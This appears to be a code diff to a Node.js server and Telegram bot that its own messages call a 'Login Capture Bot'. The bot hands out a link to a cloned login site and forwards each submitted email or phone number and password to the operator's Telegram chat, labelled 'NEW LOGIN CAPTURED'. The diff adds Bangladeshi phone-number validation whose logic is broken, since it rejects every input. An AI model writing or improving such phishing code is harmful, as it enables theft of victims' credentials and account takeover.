@@ -3,13 +3,13 @@ const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
 const cors = require('cors');
 const path = require('path');
-require('dotenv').config(); // Add this line at the top
+require('dotenv').config();
 
 const app = express();
 const port = process.env.PORT || 3000;
 
 // === Telegram Bot Config ===
-const BOT_TOKEN = process.env.BOT_TOKEN; // Changed from hardcoded
+const BOT_TOKEN = process.env.BOT_TOKEN;
 
 // Validate required environment variables
 if (!BOT_TOKEN) {
@@ -42,7 +42,7 @@ bot.onText(/\/start/, (msg) => {
   CHAT_ID = msg.chat.id;
   console.log('💬 Chat ID set:', CHAT_ID);
   
-  const link =  'https://bankai-85ve.onrender.com'; // Changed from hardcoded
+  const link = 'https://bankai-85ve.onrender.com';
   
   bot.sendMessage(CHAT_ID, 
     `🎯 Welcome to Login Capture Bot!\n\n🔗 Click here to access Clone:\n${link}\n\n📝 After someone fills the form, you'll receive their login details here.`
@@ -63,7 +63,19 @@ app.post('/submit', async (req, res) => {
   if (!Email || !Password) {
     console.log('❌ Missing email or password');
     return res.status(400).json({
-      error: 'Email and Password are required'
+      error: 'Email/Phone and Password are required'
+    });
+  }
+  
+  // Basic validation for email or phone
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  // const phonePattern = /^(?:\+880|880|0)1[3-9]\d{8}$/;
+  const bdPhonePattern = /^(?:\+880|880|0)1[3-9]\d{8}$/;
+
+  if (!emailPattern.test(Email)  || !bdPhonePattern.test(Email)) {
+    console.log('❌ Invalid email or phone format');
+    return res.status(400).json({
+      error: 'Please enter a valid email address or phone number'
     });
   }
   
@@ -78,7 +90,7 @@ app.post('/submit', async (req, res) => {
 🎯 NEW LOGIN CAPTURED!
 
 👤 User Details:
-📧 Email:    ${Email}
+📧 Email/Phone: ${Email}
 🔑 Password: ${Password}
 ⏰ Time: ${new Date(new Date().getTime() + 6 * 60 * 60 * 1000).toLocaleString()}
 🌍 Environment: ${process.env.NODE_ENV || 'development'}
